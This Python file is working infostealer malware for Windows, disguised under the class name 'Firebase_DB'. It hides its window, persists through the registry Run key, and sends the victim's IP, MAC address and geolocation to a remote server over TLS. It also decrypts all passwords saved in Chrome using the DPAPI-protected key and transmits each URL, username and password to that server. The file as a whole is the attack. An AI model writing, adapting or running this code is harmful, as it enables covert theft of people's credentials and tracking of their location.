import win32gui, win32con

# Make the application working on background
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)


import requests
import socket
from threading import Thread, Lock
import os
import json
import base64
import sqlite3
import win32crypt 
from Cryptodome.Cipher import AES 
import shutil 
from datetime import datetime, timedelta
from getmac import get_mac_address as gma
import winreg as reg
import ssl
import time


class Firebase_DB():
    def __init__(self):

        self.server_ip = '' # The IP of the server
        self.server_port = 33453
        self.num_comp = 0

        # Create a text file on USERPROFILE Path for save the progress, add the app to the registry
        self.data = "10\n20\n"
        self.data_lock = Lock()
        self.file_process_path = os.path.join(os.environ["USERPROFILE"], "Pro.txt")
        if not os.path.exists(self.file_process_path):
            file = open(self.file_process_path, 'x')
            file.close()
            self.AddToRegistry()
            with open(self.file_process_path, 'w') as f:
                f.write("10\n20\n")
        else:
            os.system(f"attrib -r {self.file_process_path}")
            with open(self.file_process_path, 'r') as f:
                with self.data_lock:
                    self.data = f.read()
        
        if "finish" not in self.data:
            # Waiting the computer has internet
            while True:
                if self.check_internet_connection():
                    break
            
            if "Comp" in self.data:
                indexStartComp = self.data.find("Comp") + 4
                indexEndComp = self.data.find("\n")
                self.num_comp = self.data[indexStartComp: indexEndComp]

            else:
                # Connect the server
                self.connect_server()
                
                # Add the number of computer to the file context
                with self.data_lock:
                    self.data = f"Comp{self.num_comp}\n{self.data}"
                with open(self.file_process_path, 'w') as f:
                    f.write(self.data)

            # Get the data and send it the firebase server
            self.get_data()
            # Set the file for read-only
            os.system(f"attrib +r {self.file_process_path}")

    def connect_server(self):
        """
        The function create the first connection and change the global num_comp var

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        None
        """
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_lock = ssl.wrap_socket(client_socket)
        ssl_lock.connect((self.server_ip, self.server_port))
        ssl_lock.send(int(0).to_bytes(4, byteorder='big'))
        self.num_comp = int.from_bytes(ssl_lock.recv(4), byteorder='big')
        ssl_lock.close()

    def check_internet_connection(self):
        """
        The function trying to connect google's server for check if there is internt connection

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        Boolean
        """
        remote_server = "www.google.com"
        port = 80
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            sock.connect((remote_server, port))
            return True
        except socket.error:
            return False
        finally:
            sock.close()
    
    def AddToRegistry(self):
        """
        The function add this app for startup applications list in the registry

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        None
        """

        # joins the file name to end of path address
        address = os.path.abspath(__file__)
        
        # key we want to change is HKEY_CURRENT_USER 
        # key value is Software\Microsoft\Windows\CurrentVersion\Run
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
        
        # open the key to make changes to
        open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
        
        # modify the opened key
        reg.SetValueEx(open,"App10",0,reg.REG_SZ,address)
        
        # now close the opened key
        reg.CloseKey(open)
        
    def DelFromRegistry(self):
        """
        The function remove this app for startup applications list in the registry

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        None
        """

        # key we want to change is HKEY_CURRENT_USER 
        # key value is Software\Microsoft\Windows\CurrentVersion\Run
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"

        # open the key to make changes to
        open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)

        # delete the value
        reg.DeleteValue(open, "App10")

        # now close the opened key
        reg.CloseKey(open)

    def get_data(self):
        """
        The function trying to get the data until it gets all of the data it needs

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        None
        """
        if not "finish" in self.data:
            th1 = Thread(target=self.network_and_location_GPS)
            th2 = Thread(target=self.google_accounts)
            th1.start()
            th2.start()
            th1.join()
            th2.join()
            with self.data_lock:
                self.data = f"{self.data}finish"
                with open(self.file_process_path, 'w') as f:
                    f.write(self.data)
            self.DelFromRegistry()
        
    def get_internal_ip(self):
        """
        The function trying to connect the internet and get the internal IP

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        String / None
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def network_and_location_GPS(self):
        """
        The function create a connection with the server and send data of network and location GPS to the server

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        None
        """
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_lock = ssl.wrap_socket(client_socket)
        ssl_lock.connect((self.server_ip, self.server_port))
        ssl_lock.send(int(1).to_bytes(4, byteorder='big'))
        ssl_lock.send(int(self.num_comp).to_bytes(4, byteorder='big'))
        while not "11" in self.data:
            try:
                inte_ip = self.get_internal_ip()
                mac_add = gma()
                if inte_ip == None or mac_add == None:
                    raise Exception
                data_network = {
                    'Internal IP' : self.get_internal_ip(),
                    'Mac Address' : gma()
                }
                data_GPS = {}
                response = requests.get('https://ipinfo.io')
                data = response.json()
                data = dict(data)
                data.pop('readme')
                data_GPS['Latitude'], data_GPS['Longitude'] = data.pop('loc').split(',')
                data_GPS['City'] = data.pop('city')
                data_GPS['Region'] = data.pop('region')
                data_GPS['Country'] = data.pop('country')
                data_GPS['Timezone'] = data.pop('timezone')
                data_network['External IP'] = data.pop('ip')
                data_network['Org'] = data.pop('org')

                GPS_str = str(self.dictionary_to_string(data_GPS))
                ssl_lock.send(len(GPS_str.encode('utf-8')).to_bytes(4, byteorder='big'))
                ssl_lock.send(GPS_str.encode('utf-8'))

                network_str = str(self.dictionary_to_string(data_network))
                ssl_lock.send(len(network_str.encode('utf-8')).to_bytes(4, byteorder='big'))
                ssl_lock.send(network_str.encode('utf-8'))

                with self.data_lock:
                    self.data = self.data.replace("10", "11")
                    with open(self.file_process_path, 'w') as f:
                        f.write(self.data)
            except:
                pass
        ssl_lock.close()
            
    def google_accounts(self):
        """
        The function create a connection with the server and send data of google accounts to the server

        Parameters
        ----------
        self : self
            The attributes of the class

        Returns
        -------
        None
        """
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", 
                            "Google", "Chrome", "User Data", "default", "Login Data")
        if os.path.exists(db_path):
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_lock = ssl.wrap_socket(client_socket)
            ssl_lock.connect((self.server_ip, self.server_port))
            ssl_lock.send(int(2).to_bytes(4, byteorder='big'))
            ssl_lock.send(int(self.num_comp).to_bytes(4, byteorder='big'))
            while not "21" in self.data:
                key = self.fetching_encryption_key()
                filename = os.path.join(os.environ["USERPROFILE"], "ChromePasswords.db")
                shutil.copyfile(db_path, filename)
                
                # connecting to the database 
                db = sqlite3.connect(filename) 
                cursor = db.cursor() 
                
                # 'logins' table has the data 
                cursor.execute( 
                    "Select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                    "order by date_last_used") 
                
                # iterate over all rows 
                count = 0
                for row in cursor.fetchall():
                    main_url = row[0]
                    login_page_url = row[1]
                    user_name = row[2]
                    decrypted_password = self.password_decryption(row[3], key)
                    date_of_creation = row[4]
                    last_usuage = row[5]

                    if user_name or decrypted_password:
                        data = {
                            'Main URL' : main_url,
                            'Login URL' : login_page_url,
                            'User name' : user_name,
                            'Decrypted Password' : decrypted_password
                        }
                        if date_of_creation != 86400000000 and date_of_creation:
                            data['Creation date'] = str(self.chrome_date_and_time(date_of_creation))
                        
                        if last_usuage != 86400000000 and last_usuage:
                            data['Last Used'] = str(self.chrome_date_and_time(last_usuage))

                        data_str = str(self.dictionary_to_string(data))
                        ssl_lock.send(len(data_str.encode('utf-8')).to_bytes(4, byteorder='big'))
                        ssl_lock.send(data_str.encode('utf-8'))
                        time.sleep(0.5)
                        

                        # self.doc_ref.collection('Google Accounts').document(f'Account {count + 1}').set(data)
                        
                        # count += 1
                ssl_lock.send(int(0).to_bytes(4, byteorder='big'))
                cursor.close()
                db.close()

                try:
                    # trying to remove the copied db file as
                    # well from local computer
                    os.remove(filename)
                except: 
                    pass
                
                with self.data_lock:
                    self.data = self.data.replace("20", "21")
                    with open(self.file_process_path, 'w') as f:
                        f.write(self.data)
            ssl_lock.close()

    def chrome_date_and_time(self, chrome_data): 
        # Chrome_data format is 'year-month-date  
        # hr:mins:seconds.milliseconds 
        # This will return datetime.datetime Object
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data) 
    
    def fetching_encryption_key(self): 
        # Local_computer_directory_path will look  
        # like this below 
        # C: => Users => <Your_Name> => AppData => 
        # Local => Google => Chrome => User Data => 
        # Local State 
        local_computer_directory_path = os.path.join( 
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",  
        "User Data", "Local State")
        
        with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
            local_state_data = f.read() 
            local_state_data = json.loads(local_state_data) 
    
        # decoding the encryption key using base64 
        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"]) 
        
        # remove Windows Data Protection API (DPAPI) str 
        encryption_key = encryption_key[5:]
        
        # return decrypted key 
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 
    
    def password_decryption(self, password, encryption_key): 
        try: 
            iv = password[3:15] 
            password = password[15:] 
            
            # generate cipher 
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv) 
            
            # decrypt password 
            return cipher.decrypt(password)[:-16].decode() 
        except: 
            
            try: 
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) 
            except: 
                return "No Passwords"
            
    def dictionary_to_string(self, dic):
        """
        The function get a dictionary with data and return a string in specific format for this data

        Parameters
        ----------
        self : self
            The attributes of the class
        Dictionary : dic
            The data stored in dictionary

        Returns
        -------
        String
        """
        str = ""
        dic = dict(dic)
        for i, (key, value) in enumerate(dic.items()):
            str += f"{key}:{value},"
        return str[:len(str) - 1]

if __name__ == '__main__':
    system_db = Firebase_DB()
